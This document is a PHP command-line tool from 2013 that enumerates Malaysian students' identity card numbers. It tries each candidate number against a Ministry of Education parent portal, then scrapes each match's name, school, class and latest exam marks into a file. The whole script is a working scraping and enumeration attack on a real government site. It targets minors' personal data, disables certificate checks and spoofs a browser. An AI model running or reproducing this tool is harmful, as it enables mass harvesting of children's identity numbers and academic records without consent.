<?php

/**
 * Malaysian Primary/Secondary School MultiTool
 * Author : Shahril
 * from Kedah with love
 */
 
date_default_timezone_set('Asia/Kuala_Lumpur');

echo "\n Malaysian School MultiTool CopyRight (c) 2013 Shahril\n\n";

if(empty($argv[1])){
	echo "
	\r Help :-
	\r  --scan-ic = Scan range of student IC number.
	\r  --ic-info = Get name of student with provide IC number.
	\r  --ic-result = Get LATEST result of student with provide IC number.
	
	\r --scan-ic usage : 
	\r    -state  = State student you want to scan. (Ex. 06 = pahang or 01 = johor)
	\r    -year   = Birth year of student (Ex. 1997, 1999)
	\r    -month  = Month range (Ex. 1-12 or specific month like 8 (august) )
	\r    -days   = Days range (Ex. 1-31 or specific days like 16)
	\r    -gender = Optional but you can provide if you want. (Ex. Male or Female)
	\r    -random = Four random digit. (range = 0 - 9990)
	\r    -save   = Your output file.
	\r       If you don't use this option, this scanner will use default filename.
	
	\r --ic-info usage : 
	\r    -ic [number]      = Student IC number.
	\r    -save [filename]  = Optional.
	
	\r --ic-result usage :
	\r    -ic [number]  = Student IC number.
	\r    -save [filename]  = Optional.
	
	\r Note : Output file is suck if u watch using notepad,
	\r        use another text viewer instead.
	
	";
}elseif($argv[1] == "--scan-ic"){

	// Start here take data from argument (and input checking)

	if(in_array("-state", $argv, true)){
		$key = array_search("-state", $argv);
		$value = $key + 1;
		$code_state = $argv[$value];
	}else{
		echo "\n\r Please put state !\n";
		die();
	}
	
	if(in_array("-year", $argv, true)){
		$key = array_search("-year", $argv);
		$value = $key + 1;
		$first_two_ic_number = substr($argv[$value], -2);
	}else{
		echo "\n\r Please put year !\n";
		die();
	}
	
	if(in_array("-month", $argv, true)){
		$key = array_search("-month", $argv);
		$value = $key + 1;
		$bulan_options = $argv[$value];
	}else{
		echo "\n\r Please put month !\n";
		die();
	}
	
	if(strpos($bulan_options, "-")){
		$bulan_options = explode("-", $bulan_options);
	}else{
		$bulan_options = array($bulan_options, $bulan_options);
	}
	
	if($bulan_options[0] < 1 || $bulan_options[1] > 12){
		echo "\n\r Invalid month, please put between 1 until 12 only !\n";
		die();
	}
	
	if(in_array("-days", $argv, true)){
		$key = array_search("-days", $argv);
		$value = $key + 1;
		$hari_options = $argv[$value];
	}else{
		echo "\n\r Please put days !\n";
		die();
	}
	
	if(strpos($hari_options, "-")){
		$hari_options = explode("-", $hari_options);
	}else{
		$hari_options = array($hari_options, $hari_options);
	}
	
	if($hari_options[0] < 1 || $hari_options[1] > 31){
		echo "\n\r Invalid days, please put between 1 until 31 only!\n";
		die();
	}
	
	if(in_array("-random", $argv, true)){
		$key = array_search("-random", $argv);
		$value = $key + 1;
		$empat_number = $argv[$value];
	}else{
		echo "\n\r Please put random value !\n";
		die();
	}
	
	if(strpos($empat_number, "-")){
		$empat_number = explode("-", $empat_number);
	}else{
		$empat_number = array($empat_number, $empat_number);
	}
	
	if($hari_options[0] < 0 || $hari_options[1] > 9999){
		echo "\n\r Invalid random number, please put between 0 until 9999 only!\n";
		die();
	}
	
	if(in_array("-gender", $argv, true)){
		$key = array_search("-gender", $argv);
		$value = $key + 1;
		$gender = strtolower($argv[$value]);
		if($gender != "male" && $gender != "female"){
			echo "\n\r Gender is invalid, please make sure you put \"male\" or \"female\" only !\n";
			die();
		}
	}
	
	if(in_array("-save", $argv, true)){
		$key = array_search("-save", $argv);
		$value = $key + 1;
		$file_save = $argv[$value];
	}else{
		$file_save = $first_two_ic_number."-".$code_state.".txt";
	}
	
	// End take data from argument

	$found = 0;
	$progress = 0;
	

	if(isset($gender) && $gender == "male"){
		$empat_number[0]++;
		$day_loopsetting = 2;
	}elseif(isset($gender) && $gender == "female"){
		$day_loopsetting = 2;
	}else{
		$day_loopsetting = 1;
	}
	
	echo "\r\n Output Filename : ".$file_save."\r\n\r\n";

	for($bulan = $bulan_options[0];$bulan <= $bulan_options[1];$bulan++){ // nie untuk bulan lahir..
		if($bulan != 0){
			for($hari = $hari_options[0];$hari <= $hari_options[1];$hari++){ // nie untuk hari..
				if($hari != 0){
					for($empat = $empat_number[0];$empat <= $empat_number[1];$empat += $day_loopsetting){
					
						if(isset($gender)){
							$kira_all_s = 0;
							for($kira_all = $empat_number[0];$kira_all <= $empat_number[1];$kira_all += $day_loopsetting){
								$kira_all_s++;
							}
							$days_total = $kira_all_s;
						}else{
							$days_total = $empat_number[1] - $empat_number[0] + 1;
						}
						$progress++;
						$all = ($bulan_options[1] - $bulan_options[0] + 1) * ($hari_options[1] - $hari_options[0] + 1) * $days_total;
						$percentage = number_format($progress/$all * 100, 2, '.', '');
						$susun = $first_two_ic_number.check_num($bulan).check_num($hari).$code_state.check_num_empat($empat);
						echo "\r\r Progress - ".$progress."/".$all." -> ".$percentage."% | Found = ".$found." | Checking = ".$susun;
						if(check_ic($susun)){
							$found++;
							$susun = $susun."\r\n";
							file_put_contents($file_save, $susun, FILE_APPEND);
						}
						$susun = null;
						
					}
				}
			}
		}
	}

	echo "\n\n Finish scanning!\n\n";


}elseif($argv[1] == "--ic-info"){

	if(in_array("-ic", $argv, true)){
		$key = array_search("-ic", $argv);
		$value = $key + 1;
		$ic_num = $argv[$value];
		if(strpos($ic_num, "-")){
			$data = explode("-", $ic_num);
			$ic_num = "";
			foreach($data as $kumpul){
				$ic_num .= $kumpul;
			}
		}
		if(strlen($ic_num) > 12){
			echo "\r\n Invalid IC number length, please check back ! \r\n";
			die();
		}
	}else{
		echo "\r\n Please put student IC number !\n";
		die();
	}
	
	if(in_array("-save", $argv, true)){
		$key = array_search("-save", $argv);
		$value = $key + 1;
		$filesave = $argv[$value];
	}
	
	$cookie = GetCookies(curl("http://sapsnkra.moe.gov.my/ibubapa2/index.php"));
	if(!check_ic($ic_num, $cookie, date("Y"))){
		echo "\r\n This IC number doesn't exist! \r\n";
		die();
	}
	$respond = curl("http://sapsnkra.moe.gov.my/ibubapa2/menu.php", $cookie);
	preg_match_all('/<td colspan=\"2\"><strong>(.*?)\&nbsp\;<\/strong><\/td>/', $respond, $info_output);
	
	// better IC look ;)
	$first_ic = substr($ic_num, 0, 6);
	$second_ic = substr($ic_num, 6, 2);
	$third_ic = substr($ic_num, -4);
	
	echo " Student Info : -\r\n\r\n";
	$collect_info = array(
					"Student Name" => $info_output[1][2],
					"Student IC" => $first_ic."-".$second_ic."-".$third_ic,
					"Form" => $info_output[1][3],
					"Class (In School)" => $info_output[1][4],
					"School Name" => cutstr($info_output[1][0], ") ", " ("),
					"School Code" => cutstr($info_output[1][0], "(", ")"),
					"School Telephone No." => cutstr($info_output[1][0], ": ", ")")
	);
	$collect = array();
	if(isset($filesave)){ file_put_contents($filesave, "Student Info : -\r\n\r\n", FILE_APPEND); };
	foreach($collect_info as $s_title => $s_value){
		echo $collect_s = sprintf("%-25s : %-3s", " ".$s_title, $s_value."\r\n");
		if(isset($filesave)){
			file_put_contents($filesave, $collect_s, FILE_APPEND);
		}
	}
	if(isset($filesave)){ file_put_contents($filesave, "\r\n\r\n", FILE_APPEND); };
	echo "\r\n";
	
	
}elseif($argv[1] == "--ic-result"){

	if(in_array("-ic", $argv, true)){
		$key = array_search("-ic", $argv);
		$value = $key + 1;
		$ic_num = $argv[$value];
		if(strpos($ic_num, "-")){
			$data = explode("-", $ic_num);
			$ic_num = "";
			foreach($data as $kumpul){
				$ic_num .= $kumpul;
			}
		}
		if(strlen($ic_num) > 12){
			echo "\r\n Invalid IC number length, please check back ! \r\n";
			die();
		}
	}else{
		echo "\r\n Please put student IC number !\n";
		die();
	}
	
	if(in_array("-save", $argv, true)){
		$key = array_search("-save", $argv);
		$value = $key + 1;
		$filesave = $argv[$value];
	}
	
	$cookie = GetCookies(curl("http://sapsnkra.moe.gov.my/ibubapa2/index.php"));
	if(!check_ic($ic_num, $cookie, date("Y"))){
		echo "\r\n This IC number doesn't exist! \r\n";
		die();
	}
	$respond = curl("http://sapsnkra.moe.gov.my/ibubapa2/menu.php", $cookie);
	preg_match_all('/<option value=\'(.*?)\'>/', $respond, $info_output);
	preg_match_all('/<td colspan=\"2\"><strong>(.*?)\&nbsp\;<\/strong><\/td>/', $respond, $info_output_s);
	$latest_id = $info_output[1][count($info_output) - 1];
	$post_data = "nokp=".$ic_num."&kodsek=".cutstr($info_output_s[1][0], "(", ")")."&ting=T".str_replace("TINGKATAN ", "", $info_output_s[1][3])."&kelas=".$info_output_s[1][4]."&cboPep=".$latest_id;
	$get_report = curl("http://sapsnkra.moe.gov.my/ibubapa2/analisama.php", $cookie, $post_data);
	$get_result = process_result($get_report);
	echo "\r\n";
	echo "\r Exam Name : ".$get_result['Exam_Name']."\r\n\r\n";
	$total_mark = 0;
	$mask = "%-35.80s : %-3.8s\n";
	foreach($get_result['Exam_Mark_Array'] as $subject => $mark){
		$total_mark += $mark;
		echo $string_mark_info = sprintf($mask, " ".$subject, $mark." %");
		if(isset($filesave)){
			file_put_contents($filesave, $string_mark_info, FILE_APPEND);
		}
	}
	echo "\nComment : ";
	comment($total_mark, count($get_result['Exam_Mark_Array']) * 100);
	echo "\n\r\n";
	
}

function comment($mark, $total_mark){
	$percentage = $mark/$total_mark * 100;
	if($percentage >= 80 && $percentage <= 100){
		echo "Very Good! Excellent Student!";
	}elseif($percentage >= 60 && $percentage < 80){
		echo "Good student ( Got some skill )";
	}elseif($percentage >= 40 && $percentage < 60){
		echo "Average student ( average skill )";
	}elseif($percentage >= 20 && $percentage < 40){
		echo "Low-average student";
	}elseif($percentage >= 0 && $percentage < 20){
		echo "Bad student in academic!";
	}
	echo "  -> ".number_format($percentage, 2, '.', '')."/100 %";
}

function process_result($data){

	preg_match_all('/colspan\=\'2\'\>\<div\ align\=\"center\">(.*?)\<\/div\>\<\/td>/', $data, $exam_list);
	preg_match_all('/25px\;\">(.*?)<\/tr>/s', $data, $collect_result_big);
	$collect_subject = array();
	foreach($collect_result_big[1] as $begin_collect){
		preg_match_all('/<td>(.*?)<\/td>/', $begin_collect, $out_a);
		$collect_subject[] = $out_a[1][1];
	}
	$exam_list_flip = array_flip($exam_list[1]);
	for($i = 0;$i < count($exam_list_flip);$i++){
		$exam_list_flip[$exam_list[1][$i]] = array();
		foreach($collect_subject as $subject_loop){
			$exam_list_flip[$exam_list[1][$i]][] = $subject_loop;
		}
	}
	$move_second = $exam_list_flip;
	for($i = 0;$i < count($move_second);$i++){
		$exam_list_flip[$exam_list[1][$i]] = array_flip($move_second[$exam_list[1][$i]]);
	}
	$subject_each = 0;
	foreach($collect_result_big[1] as $insert_data){
		preg_match_all('/<td><center>(.*?)<\/center><\/td>/', $insert_data, $marks);
		$number_each = 0;
		for($i = 0;$i < count($marks[1]);$i += 2){
			$exam_list_flip[$exam_list[1][$number_each]][$collect_subject[$subject_each]] = $marks[1][$i];
			$number_each++;
		}
		$subject_each++;
	}
	$collect_mark_total = array();
	for($i = 0;$i < count($exam_list_flip);$i++){
		$total_all_from_list = 0;
		for($n = 0;$n < count($exam_list_flip[$exam_list[1][$i]]);$n++){
			$total_all_from_list += $exam_list_flip[$exam_list[1][$i]][$collect_subject[$n]];
		}
		$collect_mark_total[] = $total_all_from_list;
	}
	$collect_latest = 0;
	for($i = 0;$i < count($collect_mark_total);$i++){
		if($collect_mark_total[$i] != 0){
			$collect_latest = $i;
		}
	}
	$return_data = array("Exam_Name" => $exam_list[1][$collect_latest], "Exam_Mark_Array" => $exam_list_flip[$exam_list[1][$collect_latest]]);
	return $return_data;

}

function check_num($num){
	if($num < 10){
		return "0".$num;
	}else{
		return $num;
	}
}

function check_num_empat($num){
	if($num < 10){
		return "000".$num;
	}elseif($num < 100){
		return "00".$num;
	}elseif($num < 1000){
		return "0".$num;
	}else{
		return $num;
	}
}

function check_ic($int_ic, $cookie = "", $year){
	$respond = curl("http://sapsnkra.moe.gov.my/ibubapa2/semak.php", $cookie, "txtIC=".$int_ic."&Semak=Semak+Laporan&jenissek=2&tahun_semasa=".$year);
	if(strpos($respond, '"menu.php"')){
		return true;
	}else{
		return false;
	}
}

function cutstr($data, $str1, $str2){
	$data = explode($str1, $data);
	$data = explode($str2, $data[1]);
	return $data[0];
}

function GetCookies($content){
	preg_match_all('/Set-Cookie: (.*);/U',$content,$temp);
	$cookie = $temp[1];
	$cookies = implode('; ',$cookie);
	return $cookies;
}

$user_agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11";

function curl($url, $cookies = "", $post = ""){
	global $user_agent;
	$ch = @curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if($cookies) curl_setopt($ch, CURLOPT_COOKIE, $cookies);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	if($post){
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
	}
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
	$page = curl_exec( $ch);
	curl_close($ch); 
	return $page;
}

?>
